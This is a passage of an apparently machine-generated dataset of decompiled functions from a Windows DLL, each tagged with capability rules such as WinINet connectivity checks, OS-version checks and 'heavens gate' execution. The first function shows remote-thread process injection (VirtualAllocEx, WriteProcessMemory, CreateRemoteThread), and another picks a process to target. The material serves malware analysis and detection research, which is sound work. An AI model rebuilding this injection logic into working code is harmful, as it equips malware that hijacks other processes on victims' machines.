uStack1136)) && (uStack1136 != 0)) {\n                    iStack1128 = iStack1168 + 0x18 + *(iStack1168 + 0x14);\n                    uStack1160 = 0;\n                    while ((uStack1160 < uStack1156 &&\n                           ((*(iStack1128 + 0x10 + uStack1160 * 0x28) == 0 ||\n                            ((iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                                (arg1_00, iStack1144 + *(iStack1128 + 0xc + uStack1160 * 0x28), \n                                                 arg3 + *(iStack1128 + 0x14 + uStack1160 * 0x28), \n                                                 *(iStack1128 + 0x10 + uStack1160 * 0x28), &uStack1280),  iVar1 != 0 &&\n                             (uStack1280 == *(iStack1128 + 0x10 + uStack1160 * 0x28)))))))) {\n                        uStack1160 = uStack1160 + 1;\n                    }\n                    if (uStack1160 == uStack1156) {\n                        if (uStack1136 < 0x401) {\n                            uStack32 = uStack1136;\n                        }\n                        else {\n                            uStack32 = 0x400;\n                        }\n                        puVar4 = &uStack1280;\n                        iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                          (arg1_00, iStack1144 + uStack1088, auStack1080, uStack32, puVar4);\n                        uVar5 = puVar4 >> 0x20;\n                        if (iVar1 != 0) {\n                            if (uStack1136 < 0x401) {\n                                uStack24 = uStack1136;\n                            }\n                            else {\n                                uStack24 = 0x400;\n                            }\n                            if ((uStack1280 == uStack24) && (uStack1136 != 0)) {\n                                if (in_stack_00000030 != 0) {\n                                    puVar4 = &uStack1280;\n                                    iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                                      (arg1_00, iStack1144 + uStack1088 + uStack1136, in_stack_00000028\n                                                       , in_stack_00000030, puVar4);\n                                    uVar5 = puVar4 >> 0x20;\n                                    if ((iVar1 == 0) || (uStack1280 != in_stack_00000030)) goto code_r0x000180006230;\n                                }\n                                uStack1264 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(0x180018870);\n                                uStack1256 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1264, 0x180018888);\n                                uStack1248 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uStack1264, 0x180018898);\n                                uStack1232 = *(iStack1168 + 0x30);\n                                iStack1224 = iStack1144;\n                                uStack1216 = auStack56[0];\n                                iStack1200 = iStack1144 + uStack1088;\n                                uStack1208 = uStack1136;\n                                if (in_stack_00000030 == 0) {\n                                    iStack1192 = 0;\n                                }\n                                else {\n                                    iStack1192 = iStack1144 + uStack1088 + uStack1136;\n                                }\n                                uStack1112 = 0x7c0;\n                                uStack1212 = arg2;\n                                iStack1104 = (*_sym.imp.KERNEL32.dll_VirtualAllocEx)\n                                                       (arg1_00, 0, 0x808, 0x3000, CONCAT44(uVar5, 0x40));\n                                if (((((iStack1104 != 0) &&\n                                      (iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                                         (arg1_00, iStack1104, 0x180005370, uStack1112, &uStack1280), \n                                      iVar1 != 0)) && (uStack1280 == uStack1112)) &&\n                                    ((uStack1112 != 0 &&\n                                     (iVar1 = (*_sym.imp.KERNEL32.dll_WriteProcessMemory)\n                                                        (arg1_00, iStack1104 + uStack1112, &uStack1256, 0x48, \n                                                         &uStack1280),  iVar1 != 0)))) &&\n                                   ((uStack1280 == 0x48 &&\n                                    (iStack1096 = (*_sym.imp.KERNEL32.dll_CreateRemoteThread)\n                                                            (arg1_00, 0, 0, iStack1104, iStack1104 + uStack1112, 0, 0), \n                                    iStack1096 != 0)))) {\n                                    uStack1272 = 1;\n                                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iStack1096);\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\ncode_r0x000180006230:\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(arg1_00);\n    return uStack1272;\n}\n",
        "token_count": 2090
    },
    "1800065a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.1800065a0(void)\n\n{\n    int64_t iVar1;\n    uchar *puVar2;\n    int16_t aiStack568 [264];\n    int16_t *piStack40;\n    int16_t *piStack32;\n    int16_t *piStack24;\n    int16_t iStack16;\n    \n    puVar2 = 0x18001e058;\n    for (iVar1 = 0x14; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    piStack40 = fcn.1800064e0();\n    piStack32 = aiStack568;\n    piStack24 = piStack32;\n    do {\n        iStack16 = *piStack40;\n        *piStack32 = iStack16;\n        piStack40 = piStack40 + 1;\n        piStack32 = piStack32 + 1;\n    } while (iStack16 != 0);\n    (**0x18001df80)(aiStack568, 0x18001e058);\n    return 0x18001e058;\n}\n",
        "token_count": 258
    },
    "1800067a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.1800067a0(int64_t arg1, int64_t arg2, ulong arg3, ulong arg4)\n\n{\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    \n    for (uStack24 = 0; uStack24 < arg4; uStack24 = uStack24 + 1) {\n        for (uStack20 = 0; uStack20 < arg3; uStack20 = uStack20 + 1) {\n            if (*(arg2 + uStack24 * 4) == *(arg1 + uStack20 * 4)) {\n                *(arg2 + uStack24 * 4) = 0;\n            }\n        }\n    }\n    uStack16 = 0;\n    while( true ) {\n        if (arg4 <= uStack16) {\n            return 0;\n        }\n        if (*(arg2 + uStack16 * 4) != 0) break;\n        uStack16 = uStack16 + 1;\n    }\n    return *(arg2 + uStack16 * 4);\n}\n",
        "token_count": 241
    },
    "18000687": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.180006870(ulong arg1)\n\n{\n    int64_t iVar1;\n    \n    iVar1 = (**0x18001de90)(0x100001, 1, arg1);\n    if (iVar1 != 0) {\n        (**0x18001de98)(iVar1, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "1800068c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.1800068c0(void)\n\n{\n    uint16_t *puVar1;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint16_t *puVar5;\n    int64_t iVar6;\n    uchar *puVar7;\n    uint32_t uStack600;\n    int32_t iStack596;\n    int32_t iStack592;\n    uint16_t *puStack584;\n    ulong uStack576;\n    uchar auStack568 [8];\n    int32_t iStack560;\n    uint uStack552;\n    uchar auStack548 [204];\n    uint uStack344;\n    uchar auStack336 [52];\n    uint uStack284;\n    ushort uStack280;\n    uint uStack232;\n    uchar auStack228 [204];\n    uint32_t auStack24 [4];\n    \n    puVar7 = auStack336;\n    for (iVar6 = 0x60; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    uStack344 = 0x68;\n    uStack284 = 1;\n    uStack280 = 0;\n    uStack576 = 0;\n    puVar7 = auStack568;\n    for (iVar6 = 0x10; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    iStack592 = 0;\n    uStack552 = 0;\n    puVar7 = auStack548;\n    for (iVar6 = 0xc4; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    uStack600 = 0;\n    fcn.1800066d0(&uStack552, &uStack600);\n    puStack584 = fcn.18000ae48(L\"explorer.exe /n\");\n    iVar4 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0);\n    if (iVar4 == 0) {\n        iStack560 = 0;\n    }\n    else {\n        puVar5 = puStack584;\n        do {\n            uVar2 = *puVar5;\n            puVar1 = puVar5 + (L\"cmd.exe\" - puStack584);\n            if (uVar2 != *puVar1) {\n                uVar3 = uVar2 < *puVar1;\n                iVar4 = (1 - uVar3) - (uVar3 != 0);\n                goto code_r0x0001800069f5;\n            }\n            puVar5 = puVar5 + 1;\n        } while (uVar2 != 0);\n        iVar4 = 0;\ncode_r0x0001800069f5:\n        if (iVar4 != 0) {\n            iStack596 = 5;\n            do {\n                if (iStack596 == 0) {\n                    return iStack592;\n                }\n                iStack596 = iStack596 + -1;\n                (**0x18001dea8)(5000);\n                uStack232 = 0;\n                puVar7 = auStack228;\n                for (iVar6 = 0xc4; iVar6 != 0; iVar6 = iVar6 + -1) {\n                    *puVar7 = 0;\n                    puVar7 = puVar7 + 1;\n                }\n                auStack24[0] = 0;\n                fcn.1800066d0(&uStack232, auStack24);\n                iStack592 = fcn.1800067a0(&uStack552, &uStack232, uStack600, auStack24[0]);\n                iStack560 = iStack592;\n            } while (iStack592 == 0);\n        }\n    }\n    return iStack560;\n}\n",
        "token_count": 874
    },
    "180006c2": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.180006c20(ulong arg1, ulong arg2, uchar *arg3, ulong arg4)\n\n{\n    int32_t iVar1;\n    uchar *puVar2;\n    uchar *puStack104;\n    uint32_t uStack96;\n    uchar *puStack88;\n    uchar *puStack72;\n    uint32_t uStack40;\n    uchar *puStack32;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    \n    if ((arg2 < 1) || (arg4 < 1)) {\n        uStack96 = 1;\n    }\n    else {\n        puStack88 = NULL;\n        puStack72 = fcn.1800066b0(arg3, 0x40);\n        if ((puStack72 == NULL) || (puStack72 == arg3)) {\n            puStack72 = NULL;\n        }\n        if (puStack72 == NULL) {\n            uStack40 = fcn.1800068c0();\n            puStack32 = arg3;\n        }\n        else {\n            puStack32 = puStack72 + 1;\n            *puStack72 = 0;\n            uStack40 = fcn.18000ae3c(arg3);\n            puStack88 = arg3;\n        }\n        if (uStack40 == 0) {\n            uStack96 = 1;\n        }\n        else {\n            puVar2 = fcn.1800066b0(puStack32, 0x23);\n            if (puVar2 == NULL) {\n                puStack104 = NULL;\n            }\n            else {\n                *puVar2 = 0;\n                if (puVar2 == puStack32) {\n                    puStack32 = NULL;\n                }\n                puStack104 = puStack32;\n            }\n            if (puStack104 == NULL) {\n                uStack24 = 1;\n            }\n            else {\n                uStack24 = fcn.18000ae3c(puStack104);\n            }\n            iVar1 = fcn.180005b40(uStack40, uStack24, arg1, arg2);\n            uStack20 = iVar1 != 1;\n            uStack96 = uStack20;\n            if ((uStack20 != 0) && (uStack96 = (**0x18001def8)(),  uStack96 == 0)) {\n                uStack96 = 0xfffffc18;\n            }\n            if (((uStack40 != 0) && (uStack96 != 0)) && (puStack88 == NULL)) {\n                fcn.180006870(uStack40);\n            }\n        }\n    }\n    return uStack96;\n}\n",
        "token_count": 573
    },
    "180006eb": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x000180006ec8)\n\nvoid fcn.180006eb0(void)\n\n{\n    do {\n        (**0x18001dea8)(86400000);\n    } while( true );\n}\n",
        "token_count": 52
    },
    "18000a74": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.18000a740(int64_t arg1)\n\n{\n    if (*(arg1 + 0x10) != '\\0') {\n        fcn.18000a06c(*(arg1 + 8));\n    }\n    *(arg1 + 8) = 0;\n    *(arg1 + 0x10) = 0;\n    return;\n}\n",
        "token_count": 80
    },
    "18001050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001800104a3)\n// WARNING: Removing unreachable block (ram,0x0001800104a8)\n// WARNING: Removing unreachable block (ram,0x0001800104ae)\n// WARNING: Removing unreachable block (ram,0x0001800104b6)\n// WARNING: Removing unreachable block (ram,0x0001800104ba)\n\nint32_t fcn.180010504(void)\n\n{\n    int64_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    \n    iVar4 = 0;\n    fcn.18001071c(1);\n    for (uVar3 = 0; uVar3 < *0x18001f2c0; uVar3 = uVar3 + 1) {\n        iVar5 = uVar3;\n        if ((*(*0x18001e2b0 + iVar5 * 8) != 0) && (iVar1 = *(*0x18001e2b0 + iVar5 * 8),  (*(iVar1 + 0x18) & 0x83) != 0))\n        {\n            fcn.18000b578(uVar3, iVar1);\n            iVar1 = *(*0x18001e2b0 + iVar5 * 8);\n            if (((*(iVar1 + 0x18) & 0x83) != 0) && (iVar2 = fcn.1800103cc(iVar1),  iVar2 != -1)) {\n                iVar4 = iVar4 + 1;\n            }\n            fcn.18000b5f8(uVar3, *(*0x18001e2b0 + iVar5 * 8));\n        }\n    }\n    fcn.18001061c(1);\n    return iVar4;\n}\n",
        "token_count": 410
    },
    "18001231": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.180012318(uint16_t *arg1, uint8_t *arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int64_t var_20h;\n    int64_t var_10h;\n    ulong var_8h;\n    \n    if ((arg2 != NULL) && (arg3 != 0)) {\n        if (*arg2 != 0) {\n            fcn.18000b618(&var_20h, arg4);\n            if (*(var_20h + 0x14) != 0) {\n                iVar2 = fcn.180011430(*arg2, &var_20h);\n                if (iVar2 == 0) {\n                    iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(*(var_20h + 4), 9, arg2, 1, arg1, arg1 != NULL)\n                    ;\n                    if (iVar2 != 0) goto code_r0x000180012394;\n                }\n                else {\n                    iVar2 = *(var_20h + 0x10c);\n                    if ((((1 < iVar2) && (iVar2 <= arg3)) &&\n                        (iVar2 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)\n                                           (*(var_20h + 4), 9, arg2, iVar2, arg1, arg1 != NULL),  iVar2 != 0)) ||\n                       ((*(var_20h + 0x10c) <= arg3 && (arg2[1] != 0)))) {\n                        uVar1 = *(var_20h + 0x10c);\n                        if (var_8h == '\\0') {\n                            return uVar1;\n                        }\n                        *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n                        return uVar1;\n                    }\n                }\n                puVar3 = fcn.18000c4c4();\n                *puVar3 = 0x2a;\n                if (var_8h != '\\0') {\n                    *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n                }\n                return 0xffffffff;\n            }\n            if (arg1 != NULL) {\n                *arg1 = *arg2;\n            }\ncode_r0x000180012394:\n            if (var_8h != '\\0') {\n                *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n            }\n            return 1;\n        }\n        if (arg1 != NULL) {\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 620
    },
    "18001424": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint64_t fcn.180014244(int64_t arg1, int64_t arg2, uint64_t arg3)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint64_t uVar3;\n    ulong var_20h;\n    int64_t var_18h;\n    int64_t var_10h;\n    ulong var_8h;\n    \n    fcn.18000b618(&var_20h, 0);\n    if (arg3 == 0) {\n        if (var_8h != '\\0') {\n            *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n        }\n        return 0;\n    }\n    if (((arg1 == 0) || (arg2 == 0)) || (0x7fffffff < arg3)) {\n        puVar2 = fcn.18000c4c4();\n        *puVar2 = 0x16;\n        fcn.18000c45c();\ncode_r0x0001800141a4:\n        if (var_8h != '\\0') {\n            *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n        }\n        uVar3 = 0x7fffffff;\n    }\n    else {\n        if (*(var_18h + 8) == 0) {\n            uVar3 = fcn.180014a40(arg1, arg2, arg3, 0);\n        }\n        else {\n            iVar1 = fcn.1800149b4(&var_20h, *(var_18h + 0xc), 0x1001, arg1);\n            if (iVar1 == 0) goto code_r0x0001800141a4;\n            uVar3 = iVar1 - 2;\n        }\n        if (var_8h != '\\0') {\n            *(var_10h + 200) = *(var_10h + 200) & 0xfffffffd;\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 464
    },
    "18000226": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nulong fcn.180002260(uchar *arg1)\n\n{\n    *arg1 = 1;\n    return 1;\n}\n",
        "token_count": 29
    },
    "1800028b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nulong fcn.1800028b0(ulong arg1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int64_t iVar3;\n    uint *puVar4;\n    uchar *puVar5;\n    uint64_t arg3;\n    uint64_t arg4;\n    ushort uStack920;\n    uchar auStack918 [398];\n    ushort uStack520;\n    uchar auStack518 [110];\n    ushort uStack408;\n    ushort uStack406;\n    ushort uStack404;\n    ushort uStack402;\n    ushort uStack400;\n    ushort uStack398;\n    ushort uStack396;\n    ushort uStack394;\n    ushort uStack392;\n    ushort uStack390;\n    ushort uStack388;\n    ushort uStack386;\n    ushort uStack384;\n    ushort uStack382;\n    ushort uStack380;\n    ushort uStack378;\n    ushort uStack376;\n    ushort uStack374;\n    uint uStack360;\n    uint32_t uStack356;\n    uint32_t uStack352;\n    char acStack72 [8];\n    ushort uStack64;\n    ushort uStack62;\n    ushort uStack60;\n    ushort uStack58;\n    ushort uStack56;\n    ushort uStack54;\n    ushort uStack52;\n    ushort uStack50;\n    ushort uStack48;\n    ushort uStack46;\n    ushort uStack44;\n    ushort uStack42;\n    ushort uStack40;\n    ushort uStack38;\n    ushort uStack36;\n    ushort uStack34;\n    ushort uStack32;\n    ushort uStack30;\n    ushort uStack28;\n    ushort uStack26;\n    ushort uStack24;\n    uint uStack16;\n    \n    uStack48 = 0x20;\n    uStack46 = 0x75;\n    uStack44 = 0x6e;\n    uStack42 = 0x6b;\n    uStack40 = 0x6e;\n    uStack38 = 0x6f;\n    uStack36 = 0x77;\n    uStack34 = 0x6e;\n    uStack32 = 0x2d;\n    uStack30 = 0x62;\n    uStack28 = 0x69;\n    uStack26 = 0x74;\n    uStack24 = 0;\n    uStack408 = 0x20;\n    uStack406 = 0x33;\n    uStack404 = 0x32;\n    uStack402 = 0x2d;\n    uStack400 = 0x62;\n    uStack398 = 0x69;\n    uStack396 = 0x74;\n    uStack394 = 0;\n    uStack64 = 0x20;\n    uStack62 = 0x36;\n    uStack60 = 0x34;\n    uStack58 = 0x2d;\n    uStack56 = 0x62;\n    uStack54 = 0x69;\n    uStack52 = 0x74;\n    uStack50 = 0;\n    puVar4 = &uStack360;\n    for (iVar3 = 0x11c; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    uStack360 = 0x11c;\n    (**0x18001df28)(&uStack360);\n    uStack520 = 0;\n    puVar5 = auStack518;\n    for (iVar3 = 0x62; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    arg4 = uStack352;\n    arg3 = uStack356;\n    fcn.18000a0ac(&uStack520, L\"%d.%d.%d\", arg3, arg4);\n    uStack920 = 0;\n    puVar5 = auStack918;\n    for (iVar3 = 0x18e; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    fcn.180002320(&uStack920);\n    cVar1 = fcn.180002260(acStack72);\n    if (cVar1 == '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&uStack920);\n        fcn.18000a0ac(auStack918 + iVar2 * 2 + -2, &uStack48, arg3, arg4);\n    }\n    else if (acStack72[0] == '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&uStack920);\n        uStack16 = fcn.18000a0ac(auStack918 + iVar2 * 2 + -2, &uStack408, arg3, arg4);\n    }\n    else {\n        iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&uStack920);\n        uStack16 = fcn.18000a0ac(auStack918 + iVar2 * 2 + -2, &uStack64, arg3, arg4);\n    }\n    uStack392 = 0x25;\n    uStack390 = 0x73;\n    uStack388 = 0x20;\n    uStack386 = 0x5b;\n    uStack384 = 0x25;\n    uStack382 = 0x73;\n    uStack380 = 0x5d;\n    uStack378 = 0xd;\n    uStack376 = 10;\n    uStack374 = 0;\n    fcn.18000a0ac(arg1, &uStack392, &uStack920, &uStack520);\n    return arg1;\n}\n",
        "token_count": 1285
    },
    "180007b9": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\nvoid fcn.180007b90(void)\n\n{\n    uchar uStack1272;\n    uchar uStack1271;\n    uchar uStack1270;\n    uchar uStack1269;\n    uchar uStack1268;\n    uchar uStack1267;\n    uchar uStack1264;\n    uchar uStack1263;\n    uchar uStack1262;\n    uchar uStack1261;\n    uchar uStack1260;\n    uchar uStack1259;\n    uchar uStack1258;\n    uchar uStack1257;\n    uchar uStack1256;\n    uchar uStack1255;\n    uchar uStack1254;\n    uchar uStack1253;\n    uchar uStack1252;\n    uchar uStack1248;\n    uchar uStack1247;\n    uchar uStack1246;\n    uchar uStack1245;\n    uchar uStack1244;\n    uchar uStack1243;\n    uchar uStack1242;\n    uchar uStack1241;\n    uchar uStack1240;\n    uchar uStack1239;\n    uchar uStack1238;\n    uchar uStack1237;\n    uchar uStack1232;\n    uchar uStack1231;\n    uchar uStack1230;\n    uchar uStack1229;\n    uchar uStack1228;\n    uchar uStack1227;\n    uchar uStack1226;\n    uchar uStack1225;\n    uchar uStack1224;\n    uchar uStack1223;\n    uchar uStack1222;\n    uchar uStack1221;\n    uchar uStack1220;\n    uchar uStack1219;\n    uchar uStack1218;\n    uchar uStack1216;\n    uchar uStack1215;\n    uchar uStack1214;\n    uchar uStack1213;\n    uchar uStack1212;\n    uchar uStack1211;\n    uchar uStack1210;\n    uchar uStack1209;\n    uchar uStack1208;\n    uchar uStack1207;\n    uchar uStack1206;\n    uchar uStack1205;\n    uchar uStack1204;\n    uchar uStack1203;\n    uchar uStack1202;\n    uchar uStack1201;\n    uchar uStack1200;\n    ulong uStack1192;\n    uchar uStack1184;\n    uchar uStack1183;\n    uchar uStack1182;\n    uchar uStack1181;\n    uchar uStack1180;\n    uchar uStack1179;\n    uchar uStack1178;\n    uchar uStack1177;\n    uchar uStack1176;\n    uchar uStack1175;\n    uchar uStack1174;\n    uchar uStack1173;\n    uchar uStack1172;\n    uchar uStack1171;\n    uchar uStack1170;\n    uchar uStack1169;\n    uchar uStack1168;\n    uchar uStack1160;\n    uchar uStack1159;\n    uchar uStack1158;\n    uchar uStack1157;\n    uchar uStack1156;\n    uchar uStack1155;\n    uchar uStack1154;\n    uchar uStack1153;\n    uchar uStack1152;\n    uchar uStack1151;\n    uchar uStack1150;\n    uchar uStack1149;\n    uchar uStack1148;\n    uchar uStack1147;\n    uchar uStack1146;\n    uchar uStack1145;\n    uchar uStack1144;\n    uchar uStack1143;\n    uchar uStack1142;\n    uchar uStack1141;\n    uchar uStack1140;\n    uchar uStack1136;\n    uchar uStack1135;\n    uchar uStack1134;\n    uchar uStack1133;\n    uchar uStack1132;\n    uchar uStack1131;\n    uchar uStack1130;\n    uchar uStack1129;\n    uchar uStack1128;\n    uchar uStack1127;\n    uchar uStack1126;\n    uchar uStack1125;\n    uchar uStack1124;\n    uchar uStack1123;\n    uchar uStack1122;\n    uchar uStack1121;\n    uchar uStack1120;\n    uchar uStack1119;\n    uchar uStack1118;\n    uchar uStack1117;\n    uchar uStack1116;\n    uchar uStack1115;\n    uchar uStack1114;\n    uchar uStack1113;\n    uchar uStack1112;\n    uchar uStack1111;\n    uchar uStack1110;\n    uchar uStack1104;\n    uchar uStack1103;\n    uchar uStack1102;\n    uchar uStack1101;\n    uchar uStack1100;\n    uchar uStack1099;\n    uchar uStack1098;\n    uchar uStack1097;\n    uchar uStack1096;\n    uchar uStack1095;\n    uchar uStack1094;\n    uchar uStack1093;\n    uchar uStack1092;\n    uchar uStack1091;\n    uchar uStack1088;\n    uchar uStack1087;\n    uchar uStack1086;\n    uchar uStack1085;\n    uchar uStack1084;\n    uchar uStack1083;\n    uchar uStack1082;\n    uchar uStack1081;\n    uchar uStack1080;\n    uchar uStack1079;\n    uchar uStack1078;\n    uchar uStack1077;\n    uchar uStack1076;\n    uchar uStack1075;\n    uchar uStack1074;\n    uchar uStack1073;\n    uchar uStack1072;\n    uchar uStack1071;\n    uchar uStack1070;\n    uchar uStack1064;\n    uchar uStack1063;\n    uchar uStack1062;\n    uchar uStack1061;\n    uchar uStack1060;\n    uchar uStack1059;\n    uchar uStack1058;\n    uchar uStack1057;\n    uchar uStack1056;\n    uchar uStack1055;\n    uchar uStack1054;\n    uchar uStack1053;\n    uchar uStack1052;\n    uchar uStack1051;\n    uchar uStack1050;\n    uchar uStack1049;\n    uchar uStack1048;\n    uchar uStack1047;\n    uchar uStack1040;\n    uchar uStack1039;\n    uchar uStack1038;\n    uchar uStack1037;\n    uchar uStack1036;\n    uchar uStack1035;\n    uchar uStack1034;\n    uchar uStack1033;\n    uchar uStack1032;\n    uchar uStack1031;\n    uchar uStack1030;\n    uchar uStack1029;\n    uchar uStack1028;\n    uchar uStack1027;\n    uchar uStack1026;\n    uchar uStack1025;\n    uchar uStack1024;\n    uchar uStack1023;\n    uchar uStack1022;\n    uchar uStack1021;\n    uchar uStack1020;\n    uchar uStack1019;\n    uchar uStack1018;\n    uchar uStack1017;\n    uchar uStack1016;\n    uchar uStack1015;\n    uchar uStack1014;\n    uchar uStack1013;\n    uchar uStack1012;\n    uchar uStack1011;\n    uchar uStack1010;\n    uchar uStack1009;\n    uchar uStack1008;\n    uchar uStack1007;\n    uchar uStack1006;\n    uchar uStack1000;\n    uchar uStack999;\n    uchar uStack998;\n    uchar uStack997;\n    uchar uStack996;\n    uchar uStack995;\n    uchar uStack994;\n    uchar uStack993;\n    uchar uStack992;\n    uchar uStack991;\n    uchar uStack990;\n    uchar uStack989;\n    uchar uStack984;\n    uchar uStack983;\n    uchar uStack982;\n    uchar uStack981;\n    uchar uStack980;\n    uchar uStack979;\n    uchar uStack978;\n    uchar uStack977;\n    uchar uStack976;\n    uchar uStack975;\n    uchar uStack974;\n    uchar uStack973;\n    uchar uStack972;\n    uchar uStack971;\n    uchar uStack968;\n    uchar uStack967;\n    uchar uStack966;\n    uchar uStack965;\n    uchar uStack964;\n    uchar uStack963;\n    uchar uStack962;\n    uchar uStack961;\n    uchar uStack960;\n    uchar uStack959;\n    uchar uStack958;\n    uchar uStack957;\n    uchar uStack956;\n    uchar uStack955;\n    uchar uStack954;\n    uchar uStack953;\n    uchar uStack952;\n    uchar uStack951;\n    uchar uStack950;\n    uchar uStack949;\n    uchar uStack944;\n    uchar uStack943;\n    uchar uStack942;\n    uchar uStack941;\n    uchar uStack940;\n    uchar uStack939;\n    uchar uStack938;\n    uchar uStack937;\n    uchar uStack936;\n    uchar uStack935;\n    uchar uStack934;\n    uchar uStack933;\n    uchar uStack932;\n    uchar uStack928;\n    uchar uStack927;\n    uchar uStack926;\n    uchar uStack925;\n    uchar uStack924;\n    uchar uStack923;\n    uchar uStack922;\n    uchar uStack921;\n    uchar uStack920;\n    uchar uStack919;\n    uchar uStack918;\n    uchar uStack917;\n    uchar uStack916;\n    uchar uStack915;\n    ulong uStack912;\n    uchar 